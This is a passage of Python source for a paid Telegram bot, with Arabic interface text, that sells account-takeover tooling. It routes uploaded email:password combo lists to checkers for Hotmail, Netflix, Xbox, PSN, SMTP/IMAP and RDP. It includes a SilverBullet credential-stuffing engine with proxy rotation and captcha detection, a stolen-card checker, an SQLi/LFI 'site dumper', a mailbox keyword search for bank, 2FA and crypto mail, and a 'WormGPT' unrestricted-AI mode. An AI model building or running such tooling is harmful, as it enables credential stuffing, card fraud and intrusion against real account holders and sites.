                [{"text": "🎯 PSN Sony Rewards",        "callback_data": "file_psnsony"}],
                [{"text": "🔱 PSN Ultra Legend ⚡",     "callback_data": "file_psn_legend"}],
                [{"text": "🔵 SilverBullet Engine",      "callback_data": "file_silverbullet"}],
                [{"text": "📬 Inboxer — كلمات مفتاحية","callback_data": "file_inboxer"}],
                [{"text": "📬 SMTP Checker",            "callback_data": "file_smtp"}],
                [{"text": "📬 IMAP Checker",            "callback_data": "file_imap"}],
                [{"text": "🌐 PlainProxy",              "callback_data": "file_plainproxy"}],
                [{"text": "🖥️ VPS Checker",            "callback_data": "file_vps"}],
                [{"text": "🎲 1xbet Checker",           "callback_data": "file_1xbet"}],
                [{"text": "🖥️ BlackRDP Checker",       "callback_data": "file_blackrdp"}],
            ]
        elif fmt == 'ulp':
            buttons = [
                [{"text": "📋 ULP Extractor (استخراج كومبو)",  "callback_data": "file_ulp_extract"}],
                [{"text": "🔢 ULP Sorter (فرز الدومينات)",     "callback_data": "file_ulp_sort"}],
                [{"text": "🔍 Outlook Scanner (5 أوضاع)",      "callback_data": "file_hotmail"}],
                [{"text": "📬 SMTP Checker",                   "callback_data": "file_smtp"}],
                [{"text": "📬 IMAP Checker",                   "callback_data": "file_imap"}],
            ]
        elif fmt == 'card':
            buttons = [
                [{"text": "💳 Claude Card Checker", "callback_data": "file_claude"}],
            ]
        elif fmt == 'url':
            buttons = [
                [{"text": "🌐 Site Vulnerability Dumper", "callback_data": "file_dumper"}],
                [{"text": "🔢 ULP Sorter",                "callback_data": "file_ulp_sort"}],
            ]

        buttons.append([{"text": "🔙 رجوع", "callback_data": "menu_main"}])

        edit_message(self.token, chat_id, prog_mid,
            f"╔══════════════════════════════════╗\n"
            f"║  📂  <b>تم تحميل الملف بنجاح ✅</b>     ║\n"
            f"╠══════════════════════════════════╣\n"
            f"║  📄 الملف   : <code>{esc(file_name[:20])}</code>\n"
            f"║  📊 السطور  : <b>{count:,}</b>\n"
            f"║  🔎 النوع   : <b>{fmt_label}</b>\n"
            f"╠══════════════════════════════════╣\n"
            f"║  👇 اختر الأداة المناسبة\n"
            f"╚══════════════════════════════════╝",
            reply_markup={"inline_keyboard": buttons})

    # ── Start checker from file ───────────────────────────────────────────────

    def _start_checker_from_session(self, chat_id, tool_key):
        session = sess(chat_id)
        lines   = session.get("pending_file_lines", [])
        if not lines:
            send_message(self.token, chat_id, "❌ لا يوجد ملف محمّل! أرفع ملف .txt أولاً.")
            return

        if str(chat_id) in self.running_scans or chat_id in self.running_scans:
            send_message(self.token, chat_id,
                "⚠️ <b>يوجد فحص جارٍ بالفعل!</b>\n"
                "استخدم زر 🛑 إيقاف الفحص أولاً.")
            return

        reset_stop_event(int(chat_id) if isinstance(chat_id, str) else chat_id)

        def on_done(cid):
            self.on_scan_complete(cid)

        # ULP tools (no progress message needed upfront)
        if tool_key == "ulp_extract":
            threading.Thread(target=run_ulp_extractor, args=(self.token, chat_id, lines), daemon=True).start()
            return
        if tool_key == "ulp_sort":
            threading.Thread(target=run_ulp_sorter, args=(self.token, chat_id, lines), daemon=True).start()
            return

        # File-based tool runners
        if tool_key == "smtp":
            threading.Thread(target=run_smtp_checker, args=(self.token, chat_id, lines), daemon=True).start()
            return
        if tool_key == "imap":
            threading.Thread(target=run_imap_checker, args=(self.token, chat_id, lines), daemon=True).start()
            return
        if tool_key == "plainproxy":
            threading.Thread(target=run_plainproxy_checker, args=(self.token, chat_id, lines), daemon=True).start()
            return
        if tool_key == "vps":
            threading.Thread(target=run_vps_checker, args=(self.token, chat_id, lines), daemon=True).start()
            return
        if tool_key == "1xbet":
            threading.Thread(target=run_1xbet_checker, args=(self.token, chat_id, lines), daemon=True).start()
            return
        if tool_key == "blackrdp":
            threading.Thread(target=run_blackrdp_checker, args=(self.token, chat_id, lines), daemon=True).start()
            return
        if tool_key == "xbox_tool":
            threading.Thread(target=run_xbox_checker, args=(self.token, chat_id, lines), daemon=True).start()
            return
        if tool_key == "psn_tool":
            threading.Thread(target=run_psn_checker, args=(self.token, chat_id, lines), daemon=True).start()
            return
        if tool_key == "psn_legend":
            threading.Thread(target=run_psn_legend_checker, args=(self.token, chat_id, lines), daemon=True).start()
            return
        if tool_key == "dumper":
            urls = [l.strip() for l in lines if l.strip().startswith("http")]
            if not urls:
                send_message(self.token, chat_id, "❌ لم يتم العثور على روابط صالحة!")
                return
            prog_mid = _send_msg_id(self.token, chat_id,
                f"🌐 <b>Site Dumper — جارٍ الفحص...</b>\n📊 {len(urls)} موقع")
            checker = SiteDumper(chat_id, self.token, urls, prog_mid)
            checker.on_complete_callback = on_done
            self.running_scans[str(chat_id)] = checker
            checker.start_scan()
            return

        # Class-based checkers
        prog_mid = _send_msg_id(self.token, chat_id, "⏳ <b>جارٍ تهيئة الفحص...</b>")

        checker = None
        if tool_key == "hotmail":
            mode = session.get("hotmail_mode","1")
            custom = session.get("custom_domain","")
            checker = HotmailScanner(chat_id, self.token, lines, mode, prog_mid,
                                     custom_domain=custom, on_complete_callback=on_done)
        elif tool_key == "netflix":
            checker = NetflixChecker(chat_id, self.token, lines, prog_mid)
            checker.on_complete_callback = on_done
        elif tool_key == "xbox_class":
            checker = XboxChecker(chat_id, self.token, lines, prog_mid)
            checker.on_complete_callback = on_done
        elif tool_key == "psn_class":
            checker = PsnCaptureChecker(chat_id, self.token, lines, prog_mid)
            checker.on_complete_callback = on_done
        elif tool_key == "boosteroid":
            checker = BoosteroidChecker(chat_id, self.token, lines, prog_mid)
            checker.on_complete_callback = on_done
        elif tool_key == "psnsony":
            checker = PsnSonyRewardsChecker(chat_id, self.token, lines, prog_mid)
            checker.on_complete_callback = on_done
        elif tool_key == "claude":
            # Extract card numbers
            cards = []
            for l in lines:
                m = re.match(r'(\d{13,19})', l.replace(' ','').replace('-',''))
                if m:
                    cards.append(m.group(1))
            if not cards:
                cards = [l.strip() for l in lines if l.strip()]
            checker = ClaudeCardChecker(chat_id, self.token, cards, prog_mid)
            checker.on_complete_callback = on_done

        if checker:
            self.running_scans[str(chat_id)] = checker
            checker.start_scan()

    # ── Handle callback queries ───────────────────────────────────────────────

    def handle_callback(self, query):
        query_id = query["id"]
        chat_id  = query["message"]["chat"]["id"]
        msg_id   = query["message"]["message_id"]
        user_id  = query["from"]["id"]
        data     = query.get("data","")
        session  = sess(chat_id)

        def ack(text="", alert=False):
            url = f"https://api.telegram.org/bot{self.token}/answerCallbackQuery"
            try:
                requests.post(url, data={"callback_query_id":query_id,"text":text,
                                          "show_alert":alert}, timeout=5)
            except Exception:
                pass

        ack()

        # ── Navigation ──────────────────────────────────────────────────────
        if data == "menu_main":
            user_first = query["from"].get("first_name","User")
            wt, wm = get_welcome_menu(user_id, user_first)
            edit_message(self.token, chat_id, msg_id, wt, reply_markup=wm)
            return

        if data == "menu_gates":
            t, m = get_gates_menu()
            edit_message(self.token, chat_id, msg_id, t, reply_markup=m)
            return

        if data == "menu_tools":
            t, m = get_tools_menu()
            edit_message(self.token, chat_id, msg_id, t, reply_markup=m)
            return

        if data == "menu_subscribe":
            t, m = get_subscribe_menu()
            edit_message(self.token, chat_id, msg_id, t, reply_markup=m)
            return

        if data == "menu_activate":
            session["waiting_admin"] = "activate_code"
            send_message(self.token, chat_id,
                "🔑 <b>تفعيل كود الاشتراك</b>\n\nأرسل كود التفعيل الخاص بك:")
            return

        if data == "menu_info":
            info_text = (
                f"ℹ️ <b>دليل البوت | Bot Guide</b> ℹ️\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📩 Hotmail — 4 أوضاع، صيغة: email:password\n"
                f"🎬 Netflix — Playwright، صيغة: email:password\n"
                f"🧠 WormGPT — ذكاء اصطناعي بلا قيود\n"
                f"🌐 Site Dumper — SQLi/LFI/Redirect\n"
                f"💳 Claude Cards — cc|mm|yy|cvv\n"
                f"🎮 Xbox V6 — Payment API + Rewards\n"
                f"🕹️ PSN Capture — Online ID + Stats\n"
                f"☁️ Boosteroid — SHA512 PoW\n"
                f"🎯 PSN Rewards — Sony rewards check\n"
                f"📬 SMTP/IMAP — فحص بريد\n"
                f"🌐 PlainProxy — فحص بروكسي\n"
                f"🖥️ VPS/BlackRDP — سيرفرات\n"
                f"🎲 1xbet — مراهنات\n"
                f"📋 ULP — استخراج وفرز كومبو\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"💎 {MY_SIGNATURE}"
            )
            edit_message(self.token, chat_id, msg_id, info_text,
                reply_markup={"inline_keyboard":[[{"text":"🔙 رجوع","callback_data":"menu_main"}]]})
            return

        if data == "menu_admin":
            roles = ok(user_id)
            if "ADMIN" not in roles and "OWNER" not in roles:
                ack("❌ غير مصرح لك!", alert=True)
                return
            t, m = get_admin_menu(user_id)
            edit_message(self.token, chat_id, msg_id, t, reply_markup=m)
            return

        # ── SilverBullet Engine callbacks ────────────────────────────────────
        if data == "menu_silverbullet":
            t, m = get_silverbullet_menu(chat_id)
            edit_message(self.token, chat_id, msg_id, t, reply_markup=m)
            return

        if data == "sb_list_configs":
            cid_str = str(chat_id)
            configs = _sb_configs.get(cid_str, [])
            if not configs:
                ack("📂 لا يوجد كونفيغ محفوظ! ارفع ملف .json", alert=True)
                return
            text = "📂 <b>الكونفيغات المحفوظة:</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
            for i, c in enumerate(configs, 1):
                cfg = c["config"]
                tgt   = cfg.get("requests",[{}])[0].get("url","?")
                steps = len(cfg.get("requests",[]))
                text += (f"{i}. <b>{esc(c['name'])}</b>\n"
                         f"   🎯 <code>{esc(tgt[:40])}</code>\n"
                         f"   🔢 خطوات: {steps}\n\n")
            send_message(self.token, chat_id, text)
            return

        if data == "sb_list_proxies":
            cid_str = str(chat_id)
            proxies = _sb_proxies.get(cid_str, [])
            if not proxies:
                ack("🌐 لا توجد بروكسيات! ارفع ملف .txt", alert=True)
                return
            sample = "\n".join(proxies[:5])
            ack(f"🌐 {len(proxies):,} بروكسي محفوظ\nمثال:\n{sample[:200]}", alert=True)
            return

        if data == "sb_clear_configs":
            _sb_configs.pop(str(chat_id), None)
            t, m = get_silverbullet_menu(chat_id)
            edit_message(self.token, chat_id, msg_id, t, reply_markup=m)
            ack("🗑️ تم مسح جميع الكونفيغات", alert=False)
            return

        if data == "sb_clear_proxies":
            _sb_proxies.pop(str(chat_id), None)
            t, m = get_silverbullet_menu(chat_id)
            edit_message(self.token, chat_id, msg_id, t, reply_markup=m)
            ack("🗑️ تم مسح جميع البروكسيات", alert=False)
            return

        if data.startswith("sb_threads_"):
            try:
                tval = int(data[11:])
            except ValueError:
                return
            cid_str = str(chat_id)
            if cid_str not in _sb_settings:
                _sb_settings[cid_str] = {}
            _sb_settings[cid_str]["threads"] = tval
            t, m = get_silverbullet_menu(chat_id)
            edit_message(self.token, chat_id, msg_id, t, reply_markup=m)
            ack(f"⚡ تم تعيين الثريدات: {tval}", alert=False)
            return

        if data == "sb_test_proxies":
            cid_str = str(chat_id)
            proxies = _sb_proxies.get(cid_str, [])
            if not proxies:
                ack("🌐 لا توجد بروكسيات محفوظة! ارفع ملف .txt أولاً", alert=True)
                return
            if cid_str in _sb_sessions:
                ack("⚠️ أوقف الفحص الجاري أولاً!", alert=True)
                return

            # Detect proxy type from settings or config
            settings   = _sb_settings.get(cid_str, {})
            configs    = _sb_configs.get(cid_str, [])
            proxy_type = "http"
            if configs:
                proxy_type = configs[-1]["config"].get("proxy_type", "http")

            edit_message(self.token, chat_id, msg_id,
                f"╔══════════════════════════════╗\n"
                f"║  🌐 <b>Proxy Checker — جارٍ البدء</b> ║\n"
                f"╠══════════════════════════════╣\n"
                f"║  📊 المجموع  │ <b>{len(proxies):,}</b>\n"
                f"║  🔌 النوع    │ <b>{proxy_type}</b>\n"
                f"║  ⚡ ثريدات  │ <b>100</b>\n"
                f"╚══════════════════════════════╝\n"
                f"⏳ جارٍ الفحص...",
                reply_markup={"inline_keyboard": [[
                    {"text": "🛑 إيقاف", "callback_data": "stop_scan"}
                ]]})

            def _on_proxy_done():
                cid_s = str(chat_id)
                n_live = len(_sb_proxies.get(cid_s, []))
                if cid_s not in _sb_settings:
                    _sb_settings[cid_s] = {}
                _sb_settings[cid_s]["last_live"] = n_live

            run_proxy_checker(
                bot_token=self.token,
                chat_id=chat_id,
                proxy_list=proxies,
                proxy_type=proxy_type,
                progress_msg_id=msg_id,
                on_done=_on_proxy_done,
            )
            return

        if data == "sb_pause":
            runner = _sb_sessions.get(str(chat_id))
            if runner:
                runner.pause()
                ack("⏸️ تم الإيقاف المؤقت", alert=False)
            else:
                ack("⚠️ لا يوجد فحص جارٍ", alert=True)
            return

        if data == "sb_resume":
            runner = _sb_sessions.get(str(chat_id))
            if runner:
                runner.resume()
                ack("▶️ استُؤنف الفحص", alert=False)
            else:
                ack("⚠️ لا يوجد فحص موقوف", alert=True)
            return

        if data == "sb_show_example":
            example = (
                "📖 <b>مثال كونفيغ SilverBullet v2</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "<b>Single-step (بسيط):</b>\n"
                "<code>{\n"
                '  "name": "MyConfig",\n'
                '  "proxy_type": "http",\n'
                '  "threads": 50,\n'
                '  "target": "https://site.com/login",\n'
                '  "method": "POST",\n'
                '  "content_type": "application/json",\n'
                '  "body": "{\\"email\\":\\"&lt;USER&gt;\\",\\"pass\\":\\"&lt;PASS&gt;\\"}",\n'
                '  "success_keys": ["dashboard","token"],\n'
                '  "fail_keys": ["invalid","wrong"],\n'
                '  "ban_keys": ["captcha","blocked"],\n'
                '  "captures": [{"name":"plan","regex":"plan.*?}"},\n'
                '               {"name":"id","regex":"id.*?}"}]\n'
                "}</code>\n\n"
                "<b>Multi-step (مع CSRF):</b>\n"
                "<code>{\n"
                '  "name": "MultiStep Config",\n'
                '  "threads": 100, "timeout": 15,\n'
                '  "retry_on_ban": true, "max_retries": 3,\n'
                '  "requests": [\n'
                '    {"name":"Get CSRF","url":"https://site.com","method":"GET",\n'
                '     "captures":[{"name":"csrf","regex":"csrf.*?"}]},\n'
                '    {"name":"Login","url":"https://site.com/api/login",\n'
                '     "method":"POST","content_type":"application/json",\n'
                '     "headers":{"X-CSRF":"&lt;csrf&gt;"},\n'
                '     "body":"{\\"e\\":\\"&lt;USER&gt;\\",\\"p\\":\\"&lt;PASS&gt;\\"}",\n'
                '     "success_keys":["ok","token"],"fail_keys":["err"],\n'
                '     "ban_keys":["captcha","429"],\n'
                '     "captures":[{"name":"plan","regex":"plan.*?}"}]}\n'
                "  ]\n"
                "}</code>"
            )
            send_message(self.token, chat_id, example)
            return

        if data == "sb_start_check":
            cid_str = str(chat_id)
            configs = _sb_configs.get(cid_str, [])
            if not configs:
                ack("❌ ارفع ملف كونفيغ (.json) أولاً!", alert=True)
                return
            if cid_str in _sb_sessions:
                ack("⚠️ يوجد فحص جارٍ بالفعل! أوقفه أولاً.", alert=True)
                return
            session["expecting_sb_combo"] = True
            session.pop("expecting_sb_proxies", None)
            settings  = _sb_settings.get(cid_str, {})
            threads   = settings.get("threads", 50)
            n_prx     = len(_sb_proxies.get(cid_str, []))
            cfg_name  = configs[-1]["name"]
            steps     = len(configs[-1]["config"].get("requests", []))
            edit_message(self.token, chat_id, msg_id,
                f"📤 <b>أرفع ملف الكومبو (.txt) للبدء</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 الكونفيغ : <b>{esc(cfg_name)}</b> ({steps} خطوة)\n"
                f"⚡ الثريدات : <b>{threads}</b>\n"
                f"🌐 البروكسي : <b>{n_prx:,}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 صيغة الكومبو:\n"
                f"<code>email@domain.com:password</code>\n"
                f"<code>username:password</code>",
                reply_markup={"inline_keyboard": [
                    [{"text": "🔙 رجوع", "callback_data": "menu_silverbullet"}]
                ]})
            return

        if data.startswith("sb_run_"):
            cid_str = str(chat_id)
            try:
                idx = int(data[7:])
            except ValueError:
                return
            configs = _sb_configs.get(cid_str, [])
            if idx >= len(configs):
                ack("❌ الكونفيغ غير موجود!", alert=True)
                return
            combo_lines = session.get("sb_pending_combo", [])
            if not combo_lines:
                ack("❌ لا يوجد كومبو! أعد رفع الملف.", alert=True)
                return
            cfg      = configs[idx]["config"]
            proxies  = _sb_proxies.get(cid_str, [])
            settings = _sb_settings.get(cid_str, {})
            threads  = settings.get("threads", 50)
            edit_message(self.token, chat_id, msg_id,
                f"🚀 <b>تم تشغيل SilverBullet!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 {esc(cfg.get('name',''))}\n"
                f"📊 {len(combo_lines):,} كومبو | ⚡ {threads} ثريد\n"
                f"🌐 {len(proxies):,} بروكسي")
            runner = SilverBulletRunner(
                chat_id=chat_id, bot_token=self.token, config=cfg,
                combo_lines=combo_lines, proxies=proxies,
                progress_msg_id=msg_id, threads=threads)
            runner.start_scan()
            session.pop("sb_pending_combo", None)
            return

        # ── Payment / Subscribe ─────────────────────────────────────────────
        if data.startswith("buy_"):
            plan_key = data[4:]
            plan = PAYMENT_PLANS.get(plan_key)
            if not plan:
                return
            send_invoice(self.token, chat_id,
                title=f"اشتراك {plan['label']}",
                description=f"اشتراك مميز في MULTI-TOOL BOT — {plan['label']}",
                payload=f"premium_{plan_key}_{user_id}",
                currency="XTR",
                prices=[{"label": plan["label"], "amount": plan["stars"]}]
            )
            return

        # ── Admin panel callbacks ────────────────────────────────────────────
        if data in ("admin_refresh",):
            t, m = get_admin_menu(user_id)
            edit_message(self.token, chat_id, msg_id, t, reply_markup=m)
            return

        if data == "admin_broadcast":
            roles = ok(user_id)
            if "ADMIN" not in roles and "OWNER" not in roles:
                return
            session["waiting_admin"] = "broadcast"
            send_message(self.token, chat_id, "📢 أرسل نص الرسالة التي تريد إذاعتها:")
            return

        if data == "admin_add_premium":
            roles = ok(user_id)
            if "ADMIN" not in roles and "OWNER" not in roles:
                return
            session["waiting_admin"] = "add_premium"
            send_message(self.token, chat_id, "➕ أرسل الآيدي الرقمي للمستخدم الذي تريد تمييزه:")
            return

        if data == "admin_remove_premium":
            roles = ok(user_id)
            if "ADMIN" not in roles and "OWNER" not in roles:
                return
            session["waiting_admin"] = "remove_premium"
            send_message(self.token, chat_id, "➖ أرسل الآيدي الرقمي للمستخدم الذي تريد إزالة اشتراكه:")
            return

        if data == "admin_add_admin":
            roles = ok(user_id)
            if "OWNER" not in roles:
                ack("❌ للمالك فقط!", alert=True)
                return
            session["waiting_admin"] = "add_admin"
            send_message(self.token, chat_id, "🔑 أرسل الآيدي الرقمي للمستخدم الذي تريد ترقيته لأدمن:")
            return

        if data == "admin_remove_admin":
            roles = ok(user_id)
            if "OWNER" not in roles:
                ack("❌ للمالك فقط!", alert=True)
                return
            session["waiting_admin"] = "remove_admin"
            send_message(self.token, chat_id, "❌ أرسل الآيدي الرقمي للأدمن الذي تريد إزالته:")
            return

        if data == "admin_blacklist":
            roles = ok(user_id)
            if "ADMIN" not in roles and "OWNER" not in roles:
                return
            session["waiting_admin"] = "blacklist"
            send_message(self.token, chat_id, "🚫 أرسل الآيدي الرقمي للمستخدم الذي تريد حظره:")
            return

        if data == "admin_unblacklist":
            roles = ok(user_id)
            if "ADMIN" not in roles and "OWNER" not in roles:
                return
            session["waiting_admin"] = "unblacklist"
            send_message(self.token, chat_id, "🟢 أرسل الآيدي الرقمي للمستخدم الذي تريد إلغاء حظره:")
            return

        if data == "admin_gen_code":
            roles = ok(user_id)
            if "ADMIN" not in roles and "OWNER" not in roles:
                return
            session["waiting_admin"] = "gen_code"
            plans_str = "\n".join(f"  • <code>{k}</code> — {v['label']}" for k,v in PAYMENT_PLANS.items())
            send_message(self.token, chat_id,
                f"🎟️ أرسل مفتاح الخطة لإنشاء كود تفعيل:\n{plans_str}")
            return

        # ── Gate selection ───────────────────────────────────────────────────
        if data == "gate_hotmail":
            t, m = get_hotmail_mode_menu()
            edit_message(self.token, chat_id, msg_id, t, reply_markup=m)
            return

        if data.startswith("hotmail_mode_"):
            mode = data[-1]
            session["hotmail_mode"] = mode
            if mode == "3":
                session["waiting_admin"] = "hotmail_custom_domain"
                send_message(self.token, chat_id,
                    "🎯 أرسل الدومين المراد البحث عنه (مثال: netflix.com):")
            else:
                session["state"] = "hotmail_waiting_file"
                mode_names = {"1":"General","2":"PSN Detailed","4":"Roblox Link"}
                send_message(self.token, chat_id,
                    f"📩 <b>Hotmail — {mode_names.get(mode,'General')} Scan</b>\n\n"
                    f"أرسل ملف .txt أو اكتب الكومبو مباشرة:\n"
                    f"<code>email:password</code>")
            return

        if data == "gate_netflix":
            session["state"] = "netflix_waiting_file"
            send_message(self.token, chat_id,
                "🎬 <b>Netflix Checker</b>\n\nأرسل ملف .txt بالكومبو (email:password):")
            return

        if data == "gate_wormgpt":
            session["interactive_wormgpt"] = True
            edit_message(self.token, chat_id, msg_id,
                f"🧠 <b>WormGPT AI مفعّل!</b>\n\nاكتب سؤالك الآن...\n"
                f"لإيقاف الوضع التفاعلي: /start",
                reply_markup={"inline_keyboard":[[{"text":"🔙 رجوع","callback_data":"menu_main"}]]})
            return

        if data == "gate_dumper":
            session["state"] = "dumper_waiting_file"
            send_message(self.token, chat_id,
                "🌐 <b>Site Vulnerability Dumper</b>\n\n"
                "أرسل رابط موقع مباشرة أو ملف .txt بقائمة روابط:")
            return

        if data == "gate_claude":
            session["state"] = "claude_waiting_file"
            send_message(self.token, chat_id,
                "💳 <b>Claude Card Checker</b>\n\n"
                "أرسل ملف .txt بالبطاقات أو البطاقات مباشرة:\n"
                "<code>4111111111111111|06|26|123</code>")
            return

        if data in ("gate_xbox","gate_psn","gate_boosteroid","gate_psnsony","gate_psn_legend"):
            gate_names = {
                "gate_xbox":       "🎮 Xbox/Microsoft Checker",
                "gate_psn":        "🕹️ PSN Full Capture",
                "gate_boosteroid": "☁️ Boosteroid Checker",
                "gate_psnsony":    "🎯 PSN Sony Rewards",
                "gate_psn_legend": "🔱 PSN Ultra Legend ⚡",
            }
            session["state"] = f"{data[5:]}_waiting_file"
            send_message(self.token, chat_id,
                f"{gate_names[data]}\n\nأرسل ملف .txt بالكومبو (email:password):")
            return

        if data == "gate_inboxer":
            session["state"] = "inboxer_waiting_file"
            send_message(self.token, chat_id,
                "📬 <b>IMAP Keyword Inboxer</b>\n\n"
                "يبحث في صناديق بريد جميع الدومينات عن كلمات مفتاحية محددة.\n"
                "✅ Gmail, Outlook, Yahoo, iCloud, Mail.ru, Yandex وغيرها...\n\n"
                "⬆️ أرسل ملف .txt بالكومبو (email:password):")
            return

        # ── SilverBullet: load combo from file menu ───────────────────────────
        if data == "file_silverbullet":
            cid_str = str(chat_id)
            lines   = session.get("pending_file_lines", [])
            if not lines:
                ack("❌ لا يوجد ملف محمّل!", alert=True)
                return
            configs_list = _sb_configs.get(cid_str, [])
            if not configs_list:
                edit_message(self.token, chat_id, msg_id,
                    "❌ <b>لا يوجد كونفيغ SilverBullet محفوظ!</b>\n\n"
                    "📋 ارفع ملف كونفيغ <b>.json</b> أولاً ثم ارفع الكومبو مجدداً.",
                    reply_markup={"inline_keyboard": [
                        [{"text": "🔵 SilverBullet Engine", "callback_data": "menu_silverbullet"}],
                        [{"text": "🔙 رجوع",                "callback_data": "menu_main"}],
                    ]})
                return
            if cid_str in _sb_sessions:
                ack("⚠️ يوجد فحص جارٍ بالفعل! أوقفه أولاً.", alert=True)
                return
            if len(configs_list) == 1:
                cfg      = configs_list[0]["config"]
                proxies  = _sb_proxies.get(cid_str, [])
                settings = _sb_settings.get(cid_str, {})
                threads  = settings.get("threads", int(cfg.get("threads", 50)))
                reset_stop_event(int(chat_id) if isinstance(chat_id, str) else chat_id)
                edit_message(self.token, chat_id, msg_id,
                    f"╔══════════════════════════════╗\n"
                    f"║  🚀 <b>SilverBullet — جارٍ البدء</b>  ║\n"
                    f"╠══════════════════════════════╣\n"
                    f"║  📋 {esc(cfg.get('name','')[:26])}\n"
                    f"║  🔢 خطوات: {len(cfg.get('requests',[]))}\n"
                    f"║  📊 كومبو : {len(lines):,}\n"
                    f"║  ⚡ ثريد  : {threads}\n"
                    f"║  🌐 بروكسي: {len(proxies):,}\n"
                    f"╚══════════════════════════════╝")
                runner = SilverBulletRunner(
                    chat_id=chat_id, bot_token=self.token, config=cfg,
                    combo_lines=lines, proxies=proxies,
                    progress_msg_id=msg_id, threads=threads)
                runner.start_scan()
            else:
                session["sb_pending_combo"] = lines
                kb = [[{"text": f"📋 {c['name']}", "callback_data": f"sb_run_{i}"}]
                      for i, c in enumerate(configs_list)]
                kb.append([{"text": "🔙 رجوع", "callback_data": "menu_silverbullet"}])
                edit_message(self.token, chat_id, msg_id,
                    f"✅ الكومبو جاهز ({len(lines):,} سطر)\n"
                    f"اختر الكونفيغ للفحص:",
                    reply_markup={"inline_keyboard": kb})
            return

        # ── Inboxer: keyword category selection ──────────────────────────────
        if data == "file_inboxer":
            lines = session.get("pending_file_lines", [])
            if not lines:
                ack("❌ لا يوجد ملف محمّل!", alert=True)
                return
            kb = [
                [{"text": "🎮 Gaming (PSN, Xbox, Steam...)",       "callback_data": "inboxer_cat_gaming"}],
                [{"text": "💳 Financial (PayPal, Bank, Refund...)", "callback_data": "inboxer_cat_financial"}],
                [{"text": "🛒 Shopping (Amazon, eBay, Orders...)",  "callback_data": "inboxer_cat_shopping"}],
                [{"text": "🎬 Streaming (Netflix, Spotify...)",     "callback_data": "inboxer_cat_streaming"}],
                [{"text": "🔐 Security (Reset, 2FA, OTP...)",       "callback_data": "inboxer_cat_security"}],
                [{"text": "🪙 Crypto (Bitcoin, Binance, USDT...)",  "callback_data": "inboxer_cat_crypto"}],
                [{"text": "📧 الكل — All Keywords Combined",        "callback_data": "inboxer_cat_all"}],
                [{"text": "✍️ كلمات مخصصة — Custom Keywords",      "callback_data": "inboxer_cat_custom"}],
                [{"text": "🔙 رجوع",                               "callback_data": "menu_main"}],
            ]
            edit_message(self.token, chat_id, msg_id,
                f"📬 <b>IMAP Keyword Inboxer</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 الكومبو: <b>{len(lines):,}</b> سطر\n\n"
                f"اختر فئة الكلمات المفتاحية للبحث:",
                reply_markup={"inline_keyboard": kb})
            return

        if data.startswith("inboxer_cat_"):
            cat = data[len("inboxer_cat_"):]
            lines = session.get("pending_file_lines", [])
            if not lines:
                ack("❌ لا يوجد ملف! ارفع ملف الكومبو أولاً.", alert=True)
                return
            if cat == "custom":
                session["waiting_admin"] = "inboxer_keywords"
                ack()
                send_message(self.token, chat_id,
                    "✍️ <b>أدخل كلمات البحث</b>\n\n"
                    "اكتب كلمة أو أكثر مفصولة بفاصلة (،) أو (,):\n"
                    "<code>PlayStation, PayPal, Netflix</code>")
                return
            keywords = _INBOXER_CATEGORIES.get(cat, _INBOXER_CATEGORIES["all"])
            cat_label = _INBOXER_CAT_LABELS.get(cat, cat)
            ack(f"✅ {cat_label}", alert=False)
            reset_stop_event(int(chat_id) if isinstance(chat_id, str) else chat_id)
            edit_message(self.token, chat_id, msg_id,
                f"📬 <b>Inboxer — {esc(cat_label)}</b>\n"
                f"📋 {len(lines):,} حساب | 🔑 {len(keywords)} كلمة\n"
                f"⏳ جارٍ التشغيل...")
            threading.Thread(
                target=run_inboxer_checker,
                args=(self.token, chat_id, lines, keywords),
                daemon=True
            ).start()
            return

        # ── Stop scan ────────────────────────────────────────────────────────
        if data == "stop_scan":
            cid_int = int(chat_id) if isinstance(chat_id, str) else chat_id
            ev = _checker_stop.get(cid_int)
            if ev:
                ev.set()
            ack("🛑 تم إرسال أمر الإيقاف!", alert=True)
            return

        # ── File tool selection callbacks ────────────────────────────────────
        if data.startswith("file_"):
            tool = data[5:]
            tool_map = {
                "hotmail":    "hotmail",
                "netflix":    "netflix",
                "claude":     "claude",
                "xbox_class": "xbox_class",
                "xbox_tool":  "xbox_tool",
                "psn_class":  "psn_class",
                "psn_tool":   "psn_tool",
                "boosteroid": "boosteroid",
                "psnsony":    "psnsony",
                "psn_legend": "psn_legend",
                "smtp":       "smtp",
                "imap":       "imap",
                "plainproxy": "plainproxy",
                "vps":        "vps",
                "1xbet":      "1xbet",
                "blackrdp":   "blackrdp",
                "dumper":     "dumper",
                "ulp_extract":"ulp_extract",
                "ulp_sort":   "ulp_sort",
            }
            tool_key = tool_map.get(tool)
            if tool_key:
                edit_message(self.token, chat_id, msg_id,
                    f"⏳ <b>جارٍ تشغيل {tool_key}...</b>")
                threading.Thread(
                    target=self._start_checker_from_session,
                    args=(chat_id, tool_key),
                    daemon=True
                ).start()
            return

    # ── Handle pre_checkout_query ────────────────────────────────────────────

    def handle_pre_checkout(self, query):
        answer_pre_checkout_query(self.token, query["id"], ok=True)

    # ── Handle successful_payment ─────────────────────────────────────────────

    def handle_payment(self, msg):
        chat_id = msg["chat"]["id"]
        user_id = msg["from"]["id"]
        payment = msg.get("successful_payment",{})
        payload = payment.get("invoice_payload","")
        # payload format: premium_<plan_key>_<user_id>
        try:
            parts    = payload.split("_")
            plan_key = parts[1]
            plan     = PAYMENT_PLANS.get(plan_key,{})
            secs     = plan.get("seconds",3600)
            expire_at= time.time() + secs
            uid_str  = str(user_id)
            paid     = get_cloud_list("paid")
            if uid_str not in paid:
                paid.append(uid_str)
                save_cloud_list("paid", paid)
            data = load_data()
            data.setdefault("payments",{})[uid_str] = {
                "plan":plan_key,"expire_at":expire_at,"via":"stars",
                "stars":payment.get("total_amount",0)
            }
            save_data(data)
            send_message(self.token, chat_id,
                f"✅ <b>شكراً! تم تفعيل اشتراكك بنجاح!</b>\n"
                f"📦 الخطة: {plan.get('label',plan_key)}\n"
